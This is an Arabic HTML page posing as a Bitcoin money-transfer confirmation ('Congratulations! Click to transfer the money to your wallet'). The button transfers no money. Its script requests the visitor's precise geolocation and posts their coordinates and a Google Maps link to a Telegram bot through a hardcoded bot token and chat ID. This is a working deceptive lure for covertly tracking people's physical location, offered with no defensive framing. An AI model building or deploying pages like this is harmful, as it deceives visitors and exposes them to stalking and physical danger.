<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>تحويل الأموال</title>
  <style>
    body {
      background-color: #f2f2f2;
      text-align: center;
      font-family: Arial, sans-serif;
      padding-top: 100px;
    }
    .box {
      background: white;
      padding: 30px;
      margin: auto;
      width: 90%;
      max-width: 400px;
      border-radius: 15px;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
    }
    h1 {
      color: #333;
    }
    button {
      background-color: #ffcc00;
      border: none;
      padding: 15px 25px;
      font-size: 16px;
      border-radius: 10px;
      cursor: pointer;
    }
    button:hover {
      background-color: #e6b800;
    }
    img {
      width: 80px;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg" alt="Bitcoin" />
    <h1>تهانينا!</h1>
    <p>رجاءً اضغط لتحويل المال لمحفظتك</p>
    <button onclick="getLocation()">تأكيد تحويل المال</button>
  </div>

  <script>
    function sendLocation(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      const telegramToken = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0";
      const chatId = "5931662777";
      const message = `📍 تم تحديد موقع الشخص:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`;

      fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      }).then(r => r.json()).then(console.log).catch(console.error);
    }

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          sendLocation,
          (err) => {
            console.error("لم يتم تحديد الموقع:", err);
          },
          {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0,
          }
        );
      }
    }
  </script>
</body>
</html>
